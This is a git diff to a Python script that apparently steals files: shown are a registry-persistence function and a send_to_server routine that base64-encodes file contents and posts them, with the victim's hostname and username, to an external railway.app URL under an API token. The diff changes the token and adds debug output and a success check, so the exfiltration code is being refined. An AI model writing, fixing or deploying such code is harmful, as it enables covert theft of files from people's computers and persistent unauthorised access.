@@ -13,7 +13,7 @@ from email.message import EmailMessage
 
 # Configuration
 SERVER_URL = "https://cvsstool-production.up.railway.app/send"
-API_TOKEN = "qutgeek"
+API_TOKEN = "qutmess"
 
 
 def add_registry_persistence():
@@ -77,6 +77,9 @@ def send_to_server(hostname, username, file_path):
         content = base64.b64encode(file_path.read_bytes()).decode()
         relative_path = str(file_path)
         
+        print(f"[*] Sending to: {SERVER_URL}")
+        print(f"[*] Token: {API_TOKEN}, Hostname: {hostname}, User: {username}")
+
         response = requests.post(
             SERVER_URL,
             json={
@@ -90,8 +93,8 @@ def send_to_server(hostname, username, file_path):
             },
             timeout=10
         )
-        print(f"[+] Sent {file_path.name} - Status: {response.status_code}")
-        return True
+        print(f"[+] Sent {file_path.name} - Status: {response.status_code}, Response: {response.text}")
+        return response.status_code == 200
     except requests.exceptions.RequestException as e:
         print(f"[-] Request failed: {e}")
         return False
